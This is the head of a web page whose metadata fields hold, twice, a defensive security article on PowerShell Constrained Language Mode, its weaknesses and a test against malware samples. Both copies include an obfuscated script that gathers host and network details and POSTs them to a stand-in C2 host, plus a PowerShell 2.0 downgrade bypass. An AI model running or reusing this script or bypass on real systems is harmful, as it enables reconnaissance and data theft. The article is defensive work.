<!DOCTYPE html><html><html style="background-color:#4c433f"><head><script src="/@webcomponents/webcomponentsjs/webcomponents-loader.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-8DTJPD8FFX"></script><script>
                    window.dataLayer = window.dataLayer || [];
                    function gtag(){dataLayer.push(arguments);}
                    gtag('js', new Date());
                    gtag('config', 'G-8DTJPD8FFX', {
                      page_path: window.location.pathname,
                    });
                  </script><meta charSet="utf-8"/><link rel="shortcut icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><link rel="icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><style>
            body {
              font-family: Noto Sans TC, &#x27;Lato&#x27;, sans-serif;
            }
          </style><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="facebook-domain-verification" content="ud6xuazjca17uowsk65p2jrevtvosd"/><title>A Deep Dive into PowerShell&#x27;s Constrained Language Mode</title><meta property="og:title" content="A Deep Dive into PowerShell&#x27;s Constrained Language Mode"/><meta name="description" content="*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)

## What is Constrained Language Mode and Why it Matters

When PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.

However, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.

PowerShell was launched with an option to change its [&quot;Language Mode&quot;](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today&#x27;s topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.

&lt;br&gt;

### Safer PowerShell Environment

First off, let&#x27;s take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:

&gt; - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.
&gt; - All elements of the PowerShell scripting language are permitted.
&gt; - All modules included in Windows can be imported and all commands that the modules export run in the session.
&gt; - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.
&gt; - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.
&gt; - The New-Object cmdlet can be used only on allowed types (listed below).
&gt; - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
&gt; - Type conversion is permitted, but only when the result is an allowed type.
&gt; - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
&gt; - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.
&gt; - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:
&gt;   - Scripting.Dictionary
&gt;   - Scripting.FileSystemObject
&gt;   - VBScript.RegExp

&lt;br&gt;

#### No Arbitrary C# Code via Add-Type

&gt; The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.

Many PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that&#x27;s already thrown out the window by disallowing arbitrary C# code compilation.

![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)

&lt;br&gt;

#### Non-whitelisted Types are Prohibited

&gt; - The New-Object cmdlet can be used only on allowed types (listed below).
&gt; - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
&gt; - Type conversion is permitted, but only when the result is an allowed type.
&gt; - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
&gt; - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.

In laymen&#x27;s terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.

![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)

&lt;br&gt;

### Prohibit Complex Scripts from Executing

Given the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.

![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)

Consequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.

![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)

Therefore, it is crucial to **double-check your organization&#x27;s scripts** (if you have any) *before* enrolling this policy to your endpoints.

&lt;br&gt;

### Require Explicit Feature Enrollment

Since, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.

Instead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.

&lt;br&gt;

### Effective Against Scripts, not Standard Cmdlets

It must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.

The following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.

```ps1
Start-Job -ScriptBlock {
 while($true){
  # MAC address collection
  .(&quot;{1}{3}{2}{0}&quot; -f &#x27;ariable&#x27;, &#x27;S&#x27;, &#x27;t-V&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ata&#x27;, &#x27;d&#x27;) -Value (.(&quot;{3}{2}{0}{1}&quot; -f &#x27;Ada&#x27;, &#x27;pter&#x27;, &#x27;Net&#x27;, &#x27;Get-&#x27;) | .(&quot;{1}{0}&quot; -f &#x27;ect&#x27;, &#x27;sel&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;erfac&#x27;, &#x27;Int&#x27;, &#x27;s&#x27;, &#x27;eAlia&#x27;), (&quot;{0}{1}{2}&quot; -f &#x27;MacA&#x27;, &#x27;d&#x27;, &#x27;dress&#x27;) | &amp;(&quot;{3}{2}{0}{1}&quot; -f &#x27;r&#x27;, &#x27;tTo-Json&#x27;, &#x27;e&#x27;, &#x27;Conv&#x27;) -Compress) &gt; $null
  # OSs + username collection
  .(&quot;{2}{0}{1}&quot; -f &#x27;-&#x27;, &#x27;Variable&#x27;, &#x27;Set&#x27;) -Name (&quot;{0}{1}&quot; -f &#x27;d&#x27;, &#x27;ata&#x27;) -Value (${D`ATa} + (.(&quot;{0}{2}{3}{1}&quot; -f &#x27;Ge&#x27;, &#x27;nce&#x27;, &#x27;t-CimInst&#x27;, &#x27;a&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;ting&#x27;, &#x27;Win32_Opera&#x27;, &#x27;em&#x27;, &#x27;Syst&#x27;) | .(&quot;{0}{1}&quot; -f &#x27;se&#x27;, &#x27;lect&#x27;) (&quot;{0}{1}&quot; -f &#x27;na&#x27;, &#x27;me&#x27;), (&quot;{1}{0}&quot; -f &#x27;me&#x27;, &#x27;CSNa&#x27;) | &amp;(&quot;{2}{3}{1}{0}{4}&quot; -f &#x27;o-Js&#x27;, &#x27;T&#x27;, &#x27;Conve&#x27;, &#x27;rt&#x27;, &#x27;on&#x27;) -Compress)) &gt; $null
  # WAN IP collection
  &amp;(&quot;{0}{1}{2}{3}&quot; -f &#x27;Set-&#x27;, &#x27;Vari&#x27;, &#x27;abl&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ta&#x27;, &#x27;da&#x27;) -Value (${D`AtA} + ((.(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) -useb (&quot;{1}{0}{2}&quot; -f &#x27;fig&#x27;, &#x27;ifcon&#x27;, &#x27;.me&#x27;) -user (&quot;{0}{1}&quot; -f &#x27;cur&#x27;, &#x27;l&#x27;)).&quot;cO`NTe`Nt&quot;)) &gt; $null
  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)
  .(&quot;{1}{0}{2}&quot; -f &#x27;-Variabl&#x27;, &#x27;Set&#x27;, &#x27;e&#x27;) -Name (&#x27;a&#x27;) -Value (&quot;$env:temp\$(New-Guid).txt&quot;)
  ${Da`Ta} | &amp;(&quot;{1}{2}{0}&quot; -f &#x27;le&#x27;, &#x27;O&#x27;, &#x27;ut-Fi&#x27;) ${a}
  # Compresses the file
  &amp;(&quot;{3}{0}{2}{1}&quot; -f &#x27;ompr&#x27;, &#x27;Archive&#x27;, &#x27;ess-&#x27;, &#x27;C&#x27;) -De &quot;$a.zip&quot; -Co (&quot;{0}{1}&quot; -f &#x27;Op&#x27;, &#x27;timal&#x27;) -Lit ${a}
  # Sends it back to the C2 station
  &amp;(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) (&quot;{0}{2}{3}{4}{1}&quot; -f &#x27;h&#x27;, &#x27;00&#x27;, &#x27;ttp://evil&#x27;, &#x27;.tld:&#x27;, &#x27;80&#x27;) -method (&quot;{1}{0}&quot; -f &#x27;st&#x27;, &#x27;po&#x27;) -body (.(&quot;{1}{0}{2}&quot; -f &#x27;Co&#x27;, &#x27;Get-&#x27;, &#x27;ntent&#x27;) -Lit &quot;$a.zip&quot;) &gt; $null
  &amp;(&quot;{2}{1}{0}&quot; -f &#x27;leep&#x27;, &#x27;t-S&#x27;, &#x27;Star&#x27;) -Seconds 2
  }
}
```

Additionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.

&lt;br&gt;

#### Beware of `__PSLockdownPolicy`

Aside from weaponizing existing cmdlets, if the admins had &quot;enabled&quot; the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let&#x27;s take a look at what this environment variable actually does.

![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)

We&#x27;ll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).

![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)

The call&#x27;s parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.

![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)

This theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):

&gt; As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.

It must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.

&lt;br&gt;

### Compatibility with Legacy OSs

Another thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.

![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)

While it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.

All the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn&#x27;t exist in that version, it will simply fallback to using `FullLanguage`.

![202101-9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png)

This is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.

```text
PS C:\&gt; powershell -v 2
Encountered a problem reading the registry.  Cannot find registry key SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.
```

&lt;br&gt;

## Hypothetical Testing

To see how effective this mode is against hypothetical attacks, we ...

- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.
  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren&#x27;t `*.ps1` scripts) in any way.
- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.
- ran these samples on a system with `ConstrainedLanguage` mode enabled.
- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.
  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.

![202101-10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png)

&lt;br&gt;

In our testing,

- `ConstrainedLanguage` blocked ...
  - 100% (141/141) of the samples from executing properly.
    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.
  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.
  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.
  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.
  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.
- `ConstrainedLanguage` failed to block ...
  - 0.7% (1/141) of the samples that had managed to create persistence entries.

&lt;br&gt;

## Conclusion

Since PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.

In the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.

&lt;br&gt;
"/><meta property="og:description" content="*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)

## What is Constrained Language Mode and Why it Matters

When PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.

However, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.

PowerShell was launched with an option to change its [&quot;Language Mode&quot;](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today&#x27;s topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.

&lt;br&gt;

### Safer PowerShell Environment

First off, let&#x27;s take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:

&gt; - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.
&gt; - All elements of the PowerShell scripting language are permitted.
&gt; - All modules included in Windows can be imported and all commands that the modules export run in the session.
&gt; - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.
&gt; - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.
&gt; - The New-Object cmdlet can be used only on allowed types (listed below).
&gt; - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
&gt; - Type conversion is permitted, but only when the result is an allowed type.
&gt; - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
&gt; - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.
&gt; - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:
&gt;   - Scripting.Dictionary
&gt;   - Scripting.FileSystemObject
&gt;   - VBScript.RegExp

&lt;br&gt;

#### No Arbitrary C# Code via Add-Type

&gt; The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.

Many PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that&#x27;s already thrown out the window by disallowing arbitrary C# code compilation.

![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)

&lt;br&gt;

#### Non-whitelisted Types are Prohibited

&gt; - The New-Object cmdlet can be used only on allowed types (listed below).
&gt; - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
&gt; - Type conversion is permitted, but only when the result is an allowed type.
&gt; - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
&gt; - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.

In laymen&#x27;s terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.

![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)

&lt;br&gt;

### Prohibit Complex Scripts from Executing

Given the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.

![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)

Consequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.

![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)

Therefore, it is crucial to **double-check your organization&#x27;s scripts** (if you have any) *before* enrolling this policy to your endpoints.

&lt;br&gt;

### Require Explicit Feature Enrollment

Since, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.

Instead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.

&lt;br&gt;

### Effective Against Scripts, not Standard Cmdlets

It must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.

The following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.

```ps1
Start-Job -ScriptBlock {
 while($true){
  # MAC address collection
  .(&quot;{1}{3}{2}{0}&quot; -f &#x27;ariable&#x27;, &#x27;S&#x27;, &#x27;t-V&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ata&#x27;, &#x27;d&#x27;) -Value (.(&quot;{3}{2}{0}{1}&quot; -f &#x27;Ada&#x27;, &#x27;pter&#x27;, &#x27;Net&#x27;, &#x27;Get-&#x27;) | .(&quot;{1}{0}&quot; -f &#x27;ect&#x27;, &#x27;sel&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;erfac&#x27;, &#x27;Int&#x27;, &#x27;s&#x27;, &#x27;eAlia&#x27;), (&quot;{0}{1}{2}&quot; -f &#x27;MacA&#x27;, &#x27;d&#x27;, &#x27;dress&#x27;) | &amp;(&quot;{3}{2}{0}{1}&quot; -f &#x27;r&#x27;, &#x27;tTo-Json&#x27;, &#x27;e&#x27;, &#x27;Conv&#x27;) -Compress) &gt; $null
  # OSs + username collection
  .(&quot;{2}{0}{1}&quot; -f &#x27;-&#x27;, &#x27;Variable&#x27;, &#x27;Set&#x27;) -Name (&quot;{0}{1}&quot; -f &#x27;d&#x27;, &#x27;ata&#x27;) -Value (${D`ATa} + (.(&quot;{0}{2}{3}{1}&quot; -f &#x27;Ge&#x27;, &#x27;nce&#x27;, &#x27;t-CimInst&#x27;, &#x27;a&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;ting&#x27;, &#x27;Win32_Opera&#x27;, &#x27;em&#x27;, &#x27;Syst&#x27;) | .(&quot;{0}{1}&quot; -f &#x27;se&#x27;, &#x27;lect&#x27;) (&quot;{0}{1}&quot; -f &#x27;na&#x27;, &#x27;me&#x27;), (&quot;{1}{0}&quot; -f &#x27;me&#x27;, &#x27;CSNa&#x27;) | &amp;(&quot;{2}{3}{1}{0}{4}&quot; -f &#x27;o-Js&#x27;, &#x27;T&#x27;, &#x27;Conve&#x27;, &#x27;rt&#x27;, &#x27;on&#x27;) -Compress)) &gt; $null
  # WAN IP collection
  &amp;(&quot;{0}{1}{2}{3}&quot; -f &#x27;Set-&#x27;, &#x27;Vari&#x27;, &#x27;abl&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ta&#x27;, &#x27;da&#x27;) -Value (${D`AtA} + ((.(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) -useb (&quot;{1}{0}{2}&quot; -f &#x27;fig&#x27;, &#x27;ifcon&#x27;, &#x27;.me&#x27;) -user (&quot;{0}{1}&quot; -f &#x27;cur&#x27;, &#x27;l&#x27;)).&quot;cO`NTe`Nt&quot;)) &gt; $null
  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)
  .(&quot;{1}{0}{2}&quot; -f &#x27;-Variabl&#x27;, &#x27;Set&#x27;, &#x27;e&#x27;) -Name (&#x27;a&#x27;) -Value (&quot;$env:temp\$(New-Guid).txt&quot;)
  ${Da`Ta} | &amp;(&quot;{1}{2}{0}&quot; -f &#x27;le&#x27;, &#x27;O&#x27;, &#x27;ut-Fi&#x27;) ${a}
  # Compresses the file
  &amp;(&quot;{3}{0}{2}{1}&quot; -f &#x27;ompr&#x27;, &#x27;Archive&#x27;, &#x27;ess-&#x27;, &#x27;C&#x27;) -De &quot;$a.zip&quot; -Co (&quot;{0}{1}&quot; -f &#x27;Op&#x27;, &#x27;timal&#x27;) -Lit ${a}
  # Sends it back to the C2 station
  &amp;(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) (&quot;{0}{2}{3}{4}{1}&quot; -f &#x27;h&#x27;, &#x27;00&#x27;, &#x27;ttp://evil&#x27;, &#x27;.tld:&#x27;, &#x27;80&#x27;) -method (&quot;{1}{0}&quot; -f &#x27;st&#x27;, &#x27;po&#x27;) -body (.(&quot;{1}{0}{2}&quot; -f &#x27;Co&#x27;, &#x27;Get-&#x27;, &#x27;ntent&#x27;) -Lit &quot;$a.zip&quot;) &gt; $null
  &amp;(&quot;{2}{1}{0}&quot; -f &#x27;leep&#x27;, &#x27;t-S&#x27;, &#x27;Star&#x27;) -Seconds 2
  }
}
```

Additionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.

&lt;br&gt;

#### Beware of `__PSLockdownPolicy`

Aside from weaponizing existing cmdlets, if the admins had &quot;enabled&quot; the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let&#x27;s take a look at what this environment variable actually does.

![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)

We&#x27;ll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).

![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)

The call&#x27;s parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.

![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)

This theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):

&gt; As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.

It must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.

&lt;br&gt;

### Compatibility with Legacy OSs

Another thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.

![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)

While it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.

All the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn&#x27;t exist in that version, it will simply fallback to using `FullLanguage`.

![202101-9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png)

This is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.

```text
PS C:\&gt; powershell -v 2
Encountered a problem reading the registry.  Cannot find registry key SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.
```

&lt;br&gt;

## Hypothetical Testing

To see how effective this mode is against hypothetical attacks, we ...

- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.
  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren&#x27;t `*.ps1` scripts) in any way.
- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.
- ran these samples on a system with `ConstrainedLanguage` mode enabled.
- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.
  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.

![202101-10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png)

&lt;br&gt;

In our testing,

- `ConstrainedLanguage` blocked ...
